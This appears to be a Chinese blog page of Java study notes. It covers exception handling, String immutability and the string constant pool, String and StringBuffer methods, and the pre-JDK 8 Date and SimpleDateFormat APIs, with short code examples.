<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/0305cc69a3803b657b001f20616fefc2--0f4e--image-20240916221855128.png" alt="image-20240916221855128"></p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="1、什么是异常"><a href="#1、什么是异常" class="headerlink" title="1、什么是异常"></a>1、什么是异常</h3><pre><code> 实际工作中，遇到的情况不可能是非常完美的。比如：你写的某个模块，用户输入不一定符合你的要求、你的程序要打开某个文件，这个文件可能不存在或者文件格式不对，你要读取数据库的数据，数据可能是空的等。我们的程序再跑着，内存或硬盘可能满了。等等。
</code></pre>
<p> &nbsp;  &nbsp; 软件程序在运行过程中，非常可能遇到刚刚提到的这些异常问题，我们叫异常，英文是：Exception，意思是例外。这些，例外情况，或者叫异常，怎么让我们写的程序做出合理的处理。而不至于程序崩溃。</p>
<p> &nbsp;  &nbsp; 异常指程序运行中出现的不期而至的各种状况如：文件找不到、网络连接失败、非法参数等。异常发生在程序运行期间它影响了正常的程序执行流程。</p>
<blockquote>
<p>要理解Java异常处理是如何工作的，需要掌握以下三种类型的异常</p>
</blockquote>
<ul>
<li>检查性异常：最具代表的检查性异常时用户错误或问题引起的异常，</li>
<li>这是程序员无法预见的例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。</li>
<li>运行时异常：运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。</li>
<li>错误<strong>ERROR</strong>：错误不是异常，而是脱离程序员控制的冋题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。</li>
</ul>
<h3 id="2、异常体系结构"><a href="#2、异常体系结构" class="headerlink" title="2、异常体系结构"></a>2、异常体系结构</h3><ul>
<li>Java把异常当为对象来处理，并定义一个基类 java. lang.Throwable作为所有异常的超类。</li>
<li>在 Java API中已经定义了许多异常类，这些异常类分为两大类，错误Error和异常 Exception。<img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/9dad4dc296387a3aa745bda588e541a0--66fb--1622843400375.png" alt="1622843400375"></li>
</ul>
<blockquote>
<p>Error</p>
</blockquote>
<ul>
<li>Error类对象由Java虚拟机生成并抛出，大多数错误与代码编写者所执行的操作无关。</li>
<li>Java虚拟机运行错误（ Virtual Machine Error），当JVM不再有继续执行操作所需的内存资源时，将出现 <strong>OutofMemory Error（OOM内存溢出）</strong>。这些异常发生时，Java虚拟机（JVM）一般会选择线程终止。</li>
<li>还有发生在虛拟机试图执行应用时，如类定义错误（ NoClass Deffound error）、链接错误（ Linkage Error）。这些错误是不可查的，因为它们在应用程序的控制和处理能力之外，而且绝大多数是程序运行时不允许出现的状况。</li>
</ul>
<blockquote>
<p>Exception</p>
</blockquote>
<ul>
<li>在 Exception分支中有一个重要的子类 Runtime Exception（运行时异常）<ul>
<li>ArraylndexOutOfBoundsException（数组下标越界）</li>
<li>NullPointerException（空指针异常）</li>
<li>ArithmeticException（算术异常）</li>
<li>Missing Resource Exception（丢失资源）</li>
<li>ClassNotFound Exception（找不到类）等异常，这些异常是不检查异常，程序中可以选择捕获处理，也可以不处理。</li>
</ul>
</li>
<li>这些异常一般是由程序逻辑错误引起的，程序应该从逻辑角度尽可能避免这类异常的发生； </li>
<li>Error和 Exception的区别：Error通常是灾难性的致命的错误，是程序无法控制和处理的，当出现这些异常时，Java虛拟机（JVM）一般会选择终止线程；Exception通常情况下是可以被程序处理的，并且在程序中应该尽可能的去处理这些异常。</li>
</ul>
<h3 id="3、Java异常处理机制与处理异常"><a href="#3、Java异常处理机制与处理异常" class="headerlink" title="3、Java异常处理机制与处理异常"></a>3、Java异常处理机制与处理异常</h3><ul>
<li>抛出异常</li>
<li>捕获异常</li>
<li>异常处理五个关键字：<ul>
<li>try、catch、 finally、throw、throws</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/0a394f1331265ead6eba52441a0770fa--928b--image-20240917095443916.png" alt="image-20240917095443916"></p>
<h3 id="4、自定义异常"><a href="#4、自定义异常" class="headerlink" title="4、自定义异常"></a>4、自定义异常</h3><ul>
<li>使用Java内置的异常类可以描述在编程时岀现的大部分异常情况。除此之外，用户还可以自定义异常。用户自定义异常类，只需继承 Exception类即可。</li>
<li>在程序中使用自定义异常类，大体可分为以下几个步骤：<ol>
<li>创建自定义异常类。</li>
<li>在方法中通过 throw关键字抛出异常对象。</li>
<li>如果在当前抛出异常的方法中处理异常，可以使用try- catch语句捕获并处理；否则在方法的声明处通过 throws关键字指明要抛岀给方法调用者的异常，继续进行下一步操作。</li>
<li>在出现异常方法的调用者中捕获并处理异常。</li>
</ol>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/77ec534b38864564efad53e68734991d--162a--image-20240917100058991.png" alt="image-20240917100058991"></p>
<h3 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h3><ul>
<li>处理运行时异常时，采用逻辑去合理规避同时辅助 try-catch ；</li>
<li>处理在多重 catch块后面，可以加一个 catch（ Exception）来处理可能会被遗漏的异常；</li>
<li>对于不确定的代码，也可以加上try- catch，处理潜在的异常；</li>
<li>尽量去处理异常，切忌只是简单地调用 printStackTrace0去打印输出；</li>
<li>具体如何处理异常，要根据不同的业务需求和异常类型去决定；</li>
<li>尽量添加 finally！语句块去释放占用的资源。</li>
</ul>
<h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><h3 id="1、字符串相关的类"><a href="#1、字符串相关的类" class="headerlink" title="1、字符串相关的类"></a>1、字符串相关的类</h3><h4 id="1、String类的概述"><a href="#1、String类的概述" class="headerlink" title="1、String类的概述"></a>1、String类的概述</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * String:字符串，使用一对“”引起来表示。</span></span><br><span class="line"><span class="comment">     * 1.String声明为final的，不可被继承</span></span><br><span class="line"><span class="comment">     * 2.String实现了Serializable接口：表示字符串是支持序列化的。</span></span><br><span class="line"><span class="comment">     *         实现了Comparable接口：表示String可以比较大小</span></span><br><span class="line"><span class="comment">     * 3.String内部定义了final char[] value用于存储字符串数据</span></span><br><span class="line"><span class="comment">     * 4.String:代表不可变的字符序列。简称：不可变性。</span></span><br><span class="line"><span class="comment">     *      体现：1.当对字符串重新赋值时，需要重写指定内存区域赋值，不能使用原有的value进行赋值。</span></span><br><span class="line"><span class="comment">     *           2.当对现有的字符串进行连接操作时，也需要重新指定内存区域赋值，不能使用原有的value进行赋值。</span></span><br><span class="line"><span class="comment">     *           3.当调用String的replace()方法修改指定字符或字符串时，也需要重新指定内存区域赋值，不能使用原有的value进行赋值。</span></span><br><span class="line"><span class="comment">     * 5.通过字面量的方式（区别于new）给一个字符串赋值，此时的字符串值声明在字符串常量池中。</span></span><br><span class="line"><span class="comment">     * 6.字符串常量池中是不会存储相同内容的字符串的。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h4 id="2、理解String类的不可见性"><a href="#2、理解String类的不可见性" class="headerlink" title="2、理解String类的不可见性"></a>2、理解String类的不可见性</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/d405c3f637ebd987f0af0044618984ed--8070--image-20240917103243395.png" alt="image-20240917103243395"></p>
<h4 id="3、String不同实例化方法的对比"><a href="#3、String不同实例化方法的对比" class="headerlink" title="3、String不同实例化方法的对比"></a>3、String不同实例化方法的对比</h4><ul>
<li>String对象的创建</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本质上this.value = new char[0];</span></span><br><span class="line"><span class="type">String</span>  <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//this.value = original.value;</span></span><br><span class="line"><span class="type">String</span>  <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(String original); </span><br><span class="line"></span><br><span class="line"><span class="comment">//this.value = Arrays.copyOf(value, value.length);</span></span><br><span class="line"><span class="type">String</span>  <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="type">char</span>[] a);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span>  <span class="variable">s4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="type">char</span>[] a,<span class="type">int</span> startIndex,<span class="type">int</span> count);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/f88f172d93e3c916b346a9b232fdd7e4--c081--f-011.png" alt="f-011"></p>
<p>String str1  &#x3D; “abc”;与String str2 &#x3D; new String(“abc”);的区别？</p>
<ul>
<li>字符串常量存储在字符串常量池，目的是共享</li>
<li>字符串非常量对象存储在堆中。</li>
</ul>
<h4 id="4、String不同拼接操作的对比"><a href="#4、String不同拼接操作的对比" class="headerlink" title="4、String不同拼接操作的对比"></a>4、String不同拼接操作的对比</h4><h5 id="String使用陷阱"><a href="#String使用陷阱" class="headerlink" title="String使用陷阱"></a>String使用陷阱</h5><ul>
<li><p>String s1 &#x3D; “a”; </p>
<blockquote>
<p>说明：在字符串常量池中创建了一个字面量为”a”的字符串。</p>
</blockquote>
</li>
<li><p>s1 &#x3D; s1 + “b”; </p>
<blockquote>
<p>说明：实际上原来的“a”字符串对象已经丢弃了，现在在堆空间中产生了一个字符串s1+”b”（也就是”ab”)。如果多次执行这些改变串内容的操作，会导致大量副本字符串对象存留在内存中，降低效率。如果这样的操作放到循环中，会极大影响程序的性能。</p>
</blockquote>
</li>
<li><p>String s2 &#x3D; “ab”;</p>
<blockquote>
<p>说明：直接在字符串常量池中创建一个字面量为”ab”的字符串。</p>
</blockquote>
</li>
<li><p>String s3 &#x3D; “a” + “b”;</p>
<blockquote>
<p>说明：s3指向字符串常量池中已经创建的”ab”的字符串。</p>
</blockquote>
</li>
<li><p>String s4 &#x3D; s1.intern();</p>
<blockquote>
<p>说明：堆空间的s1对象在调用intern()之后，会将常量池中已经存在的”ab”字符串赋值给s4。</p>
</blockquote>
</li>
</ul>
<h4 id="5、一道面试题"><a href="#5、一道面试题" class="headerlink" title="5、一道面试题"></a>5、一道面试题</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringTest</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">    <span class="type">char</span>[] ch = &#123; <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(String str, <span class="type">char</span> ch[])</span> &#123;</span><br><span class="line">        str = <span class="string">&quot;test ok&quot;</span>;</span><br><span class="line">        ch[<span class="number">0</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringTest</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTest</span>();</span><br><span class="line">        ex.change(ex.str, ex.ch);</span><br><span class="line">        System.out.println(ex.str);<span class="comment">//good</span></span><br><span class="line">        System.out.println(ex.ch);<span class="comment">//best</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6、JVM中涉及字符串的内存结构"><a href="#6、JVM中涉及字符串的内存结构" class="headerlink" title="6、JVM中涉及字符串的内存结构"></a>6、JVM中涉及字符串的内存结构</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/5f40e28ca82ae81c89448191221f92f0--83c8--f-06.png" alt="f-06"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/b49ce55a60f475317da97e9ee4b24e12--7a09--f-07.png" alt="f-07"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/8435cd3f8e1c81d70aea2e42ef381fbe--922d--f-08.png" alt="f-08"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/659ed8f50e7ce55076c5c296c3d69baf--6882--f-09.png" alt="f-09"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/4244078ff7a3b6a04d0d154bf6acc9f9--06e2--f-10.png" alt="f-10"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/40b729502feb4a579d2b142d353e93e8--4004--f-11.png" alt="f-11"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/a204f787a807f87378f7985085222d20--1859--f-12.png" alt="f-12"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/1b6c0ffa297bcdaceb4608573e08b701--5284--f-13.png" alt="f-13"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/23223b4d4c88ab5e9b5dff87bd1ea81d--4171--f-15.png" alt="f-15"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/bec0d1357c803bbce86c88c385b006c1--9cc2--f-16.png" alt="f-16"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/d8b42e2a9e4c2fab065e9a7160656ca5--acd9--f-17.png" alt="f-17"></p>
<h4 id="7、String常用的方法"><a href="#7、String常用的方法" class="headerlink" title="7、String常用的方法"></a>7、String常用的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * int length()：返回字符串的长度：return value.length</span></span><br><span class="line"><span class="comment"> * char charAt(int index)：返回某索引处的字符return value[index]</span></span><br><span class="line"><span class="comment"> * boolean isEmpty()：判断是否是空字符串：return value.length==0</span></span><br><span class="line"><span class="comment"> * String toLowerCase()：使用默认语言环境，将String中的所有字符转换为小写</span></span><br><span class="line"><span class="comment"> * String toUpperCase()：使用默认语言环境，将String中的所有字符转换为大写</span></span><br><span class="line"><span class="comment"> * String trim()：返回字符串的副本，忽略前导空白和尾部空白</span></span><br><span class="line"><span class="comment"> * boolean equals(Object obj)：比较字符串的内容是否相同</span></span><br><span class="line"><span class="comment"> * boolean equals IgnoreCase(String anotherString)：与equals方法类似，忽略大小写</span></span><br><span class="line"><span class="comment"> * String concat(String str)：将指定字符串连接到此字符串的结尾。等价于用“+”</span></span><br><span class="line"><span class="comment"> * int compareTo(String anotherString)：比较两个字符串的大小</span></span><br><span class="line"><span class="comment"> * String substring(int beginIndex)：返回一个新的字符串，它是此字符串的从beginIndex开始截取到最后的一个子字符串。</span></span><br><span class="line"><span class="comment"> * String substring(int beginIndex,int endIndex)：返回一个新字符串，它是此字符串从beginIndex开始截取到endIndex(不包含)的一个子字符串。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * boolean endsWith(String suffix)：测试此字符串是否以指定的后缀结束</span></span><br><span class="line"><span class="comment"> * boolean startsWith(String prefix)：测试此字符串是否以指定的前缀开始</span></span><br><span class="line"><span class="comment"> * boolean startsWith(String prefix, int toffset)：测试此字符串从指定索引开始的子字符串是否以指定前缀开始</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * boolean contains(CharSequence s)：当且仅当此字符串包含指定的 char 值序列时，返回 true</span></span><br><span class="line"><span class="comment"> * int indexOf(String str)：返回指定子字符串在此字符串中第一次出现处的索引</span></span><br><span class="line"><span class="comment"> * int indexOf(String str, int fromIndex)：返回指定子字符串在此字符串中第一次出现处的索引，从指定的索引开始</span></span><br><span class="line"><span class="comment"> * int lastIndexOf(String str)：返回指定子字符串在此字符串中最右边出现处的索引</span></span><br><span class="line"><span class="comment"> * int lastIndexOf(String str, int fromIndex)：返回指定子字符串在此字符串中最后一次出现处的索引，从指定的索引开始反向搜索</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注：indexOf和lastIndexOf方法如果未找到都是返回-1</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 替换：</span></span><br><span class="line"><span class="comment">    * String replace(char oldChar, char newChar)：返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。</span></span><br><span class="line"><span class="comment">    * String replace(CharSequence target, CharSequence replacement)：使用指定的字面值替换序列替换此字符串所有匹配字面值目标序列的子字符串。</span></span><br><span class="line"><span class="comment">    * String replaceAll(String regex, String replacement)：使用给定的 replacement 替换此字符串所有匹配给定的正则表达式的子字符串。</span></span><br><span class="line"><span class="comment">    * String replaceFirst(String regex, String replacement)：使用给定的 replacement 替换此字符串匹配给定的正则表达式的第一个子字符串。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * 匹配:</span></span><br><span class="line"><span class="comment">    * boolean matches(String regex)：告知此字符串是否匹配给定的正则表达式。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * 切片：</span></span><br><span class="line"><span class="comment">    * String[] split(String regex)：根据给定正则表达式的匹配拆分此字符串。</span></span><br><span class="line"><span class="comment">    * String[] split(String regex, int limit)：根据匹配给定的正则表达式来拆分此字符串，最多不超过limit个，如果超过了，剩下的全部都放到最后一个元素中。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>

<h4 id="8-String与其他数据类型之间的转换"><a href="#8-String与其他数据类型之间的转换" class="headerlink" title="8.String与其他数据类型之间的转换"></a>8.String与其他数据类型之间的转换</h4><ul>
<li><p>String–&gt; int  使用 Integer.parseInt(str1);将字符串转换为数字</p>
</li>
<li><p>String –&gt; char[]:调用String的toCharArray()</p>
</li>
<li><p>char[] –&gt; String:调用String的构造器</p>
</li>
<li><p>String &lt;—&gt;  byte   </p>
<ul>
<li>编码：String –&gt; byte[]:调用String的getBytes()</li>
<li>解码：byte[] –&gt; String:调用String的构造器</li>
</ul>
</li>
</ul>
<h4 id="9、StringBuffer和StringBuilder的介绍"><a href="#9、StringBuffer和StringBuilder的介绍" class="headerlink" title="9、StringBuffer和StringBuilder的介绍"></a>9、StringBuffer和StringBuilder的介绍</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * String、StringBuffer、StringBuilder三者的异同？</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * String:不可变的字符序列；底层使用char[]存储</span></span><br><span class="line"><span class="comment"> * StringBuffer:可变的字符序列；线程安全的，效率低；底层使用char[]存储</span></span><br><span class="line"><span class="comment"> * StringBuilder:可变的字符序列；jdk5.0新增的，线程不安全的，效率高；底层使用char[]存储</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="10、StringBuffer的源码分析"><a href="#10、StringBuffer的源码分析" class="headerlink" title="10、StringBuffer的源码分析"></a>10、StringBuffer的源码分析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 源码分析：</span></span><br><span class="line"><span class="comment"> * String str = new String();//char[] value = new char[0];</span></span><br><span class="line"><span class="comment"> * String str1 = new String(&quot;abc&quot;);//char[] value = new char[]&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;&#125;;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * StringBuffer sb1 = new StringBuffer();//char[] value = new char[16];底层创建了一个长度是16的数组。</span></span><br><span class="line"><span class="comment"> * System.out.println(sb1.length());//</span></span><br><span class="line"><span class="comment"> * sb1.append(&#x27;a&#x27;);//value[0] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment"> * sb1.append(&#x27;b&#x27;);//value[1] = &#x27;b&#x27;;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * StringBuffer sb2 = new StringBuffer(&quot;abc&quot;);//char[] value = new char[&quot;abc&quot;.length() + 16];</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * //问题1.System.out.println(sb2.length());//3</span></span><br><span class="line"><span class="comment"> * //问题2.扩容问题:如果要添加的数据底层数组盛不下了，那就需要扩容底层的数组。</span></span><br><span class="line"><span class="comment"> *        默认情况下，扩容为原来容量的2倍 + 2，同时将原有数组中的元素复制到新的数组中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 意义：开发中建议大家使用：StringBuffer(int capacity) 或 StringBuilder(int capacity)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="11、StringBuffer中的常用方法"><a href="#11、StringBuffer中的常用方法" class="headerlink" title="11、StringBuffer中的常用方法"></a>11、StringBuffer中的常用方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StringBuffer的常用方法：</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * StringBuffer append(xxx)：提供了很多的append()方法，用于进行字符串拼接</span></span><br><span class="line"><span class="comment">     * StringBuffer delete(int start,int end)：删除指定位置的内容</span></span><br><span class="line"><span class="comment">     * StringBuffer replace(int start, int end, String str)：把[start,end)位置替换为str</span></span><br><span class="line"><span class="comment">     * StringBuffer insert(int offset, xxx)：在指定位置插入xxx</span></span><br><span class="line"><span class="comment">     * StringBuffer reverse() ：把当前字符序列逆转</span></span><br><span class="line"><span class="comment">     * public int indexOf(String str)</span></span><br><span class="line"><span class="comment">     * public String substring(int start,int end):返回一个从start开始到end索引结束的左闭右开区间的子字符串</span></span><br><span class="line"><span class="comment">     * public int length()</span></span><br><span class="line"><span class="comment">     * public char charAt(int n )</span></span><br><span class="line"><span class="comment">     * public void setCharAt(int n ,char ch)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 总结：</span></span><br><span class="line"><span class="comment">     *     增：append(xxx)</span></span><br><span class="line"><span class="comment">     *     删：delete(int start,int end)</span></span><br><span class="line"><span class="comment">     *     改：setCharAt(int n ,char ch) / replace(int start, int end, String str)</span></span><br><span class="line"><span class="comment">     *     查：charAt(int n )</span></span><br><span class="line"><span class="comment">     *     插：insert(int offset, xxx)</span></span><br><span class="line"><span class="comment">     *     长度：length();</span></span><br><span class="line"><span class="comment">     *     遍历：for() + charAt() / toString()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<p>12、String、StringBuffer、StringBuilder效率对比   —–相比String，其他两个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对比String、StringBuffer、StringBuilder三者的效率：</span></span><br><span class="line"><span class="comment">     * 从高到低排列：StringBuilder &gt; StringBuffer &gt; String</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h3 id="2、JDK-8之前的日期时间API"><a href="#2、JDK-8之前的日期时间API" class="headerlink" title="2、JDK 8之前的日期时间API"></a>2、JDK 8之前的日期时间API</h3><p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/21debf6ef21a57f7c1120fe58649ef71--3936--f-18.png" alt="f-18"></p>
<h4 id="1、System类中获取时间戳的方法"><a href="#1、System类中获取时间戳的方法" class="headerlink" title="1、System类中获取时间戳的方法"></a>1、System类中获取时间戳的方法</h4><blockquote>
<p>System类提供的public static long currentTimeMillis()用来返回当前时间与1970年1月1日0时0分0秒之间以毫秒为单位的时间差。</p>
</blockquote>
<ul>
<li>此方法适于计算时间差。</li>
<li>计算世界时间的主要标准有：<ul>
<li>UTC(Coordinated Universal Time)</li>
<li>GMT(Greenwich Mean Time)</li>
<li>CST(Central Standard Time)</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">//返回当前时间与1970年1月1日0时0分0秒之间以毫秒为单位的时间差。</span></span><br><span class="line">        <span class="comment">//称为时间戳</span></span><br></pre></td></tr></table></figure>

<h4 id="2、Java中两个Date类的使用"><a href="#2、Java中两个Date类的使用" class="headerlink" title="2、Java中两个Date类的使用"></a>2、Java中两个Date类的使用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateDemo</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * java.util.Date类 ---&gt; 表示特定的瞬间，精确到毫秒</span></span><br><span class="line"><span class="comment">     *            |---java.sql.Date类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 1.两个构造器的使用</span></span><br><span class="line"><span class="comment">     *     &gt;构造器一：Date()：创建一个对应当前时间的Date对象</span></span><br><span class="line"><span class="comment">     *     &gt;构造器二：创建指定毫秒数的Date对象</span></span><br><span class="line"><span class="comment">     * 2.两个方法的使用</span></span><br><span class="line"><span class="comment">     *     &gt;toString():显示当前的年、月、日、时、分、秒</span></span><br><span class="line"><span class="comment">     *     &gt;getTime():获取当前Date对象对应的毫秒数。（时间戳）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 3. java.sql.Date对应着数据库中的日期类型的变量</span></span><br><span class="line"><span class="comment">     *     &gt;如何实例化</span></span><br><span class="line"><span class="comment">     *     &gt;如何将java.util.Date对象转换为java.sql.Date对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//构造器一：Date()：创建一个对应当前时间的Date对象</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(date1.toString());   <span class="comment">//Tue Sep 17 13:39:46 CST 2024</span></span><br><span class="line"></span><br><span class="line">        System.out.println(date1.getTime());    <span class="comment">//1726551586623</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造器二：创建指定毫秒数的Date对象</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">1726551586623L</span>);</span><br><span class="line">        System.out.println(date2.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建java.sql.Date对象</span></span><br><span class="line">        java.sql.<span class="type">Date</span> <span class="variable">date3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.sql.Date(<span class="number">35635325345L</span>);</span><br><span class="line">        System.out.println(date3);  <span class="comment">//1971-02-17</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//如何将java.util.Date对象转换为java.sql.Date对象</span></span><br><span class="line">        <span class="comment">//情况一：</span></span><br><span class="line"><span class="comment">//        Date date4 = new java.sql.Date(2343243242323L);</span></span><br><span class="line"><span class="comment">//        java.sql.Date date5 = (java.sql.Date) date4;</span></span><br><span class="line">        <span class="comment">//情况二：</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        java.sql.<span class="type">Date</span> <span class="variable">date7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.sql.Date(date6.getTime());</span><br><span class="line">        System.out.println(date7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/dd405cec8a709e7320fbee9bd1727cda--f922--image-20240917134808187.png" alt="image-20240917134808187"></p>
<h4 id="3、SimpleDateFormate的使用"><a href="#3、SimpleDateFormate的使用" class="headerlink" title="3、SimpleDateFormate的使用"></a>3、SimpleDateFormate的使用</h4><ul>
<li>Date类的API不易于国际化，大部分被废弃了，java.text.SimpleDateFormat类是一个不与语言环境有关的方式来格式化和解析日期的具体类。</li>
<li>它允许进行<ul>
<li>格式化：日期—&gt;文本</li>
<li>解析：文本—&gt;日期</li>
</ul>
</li>
</ul>
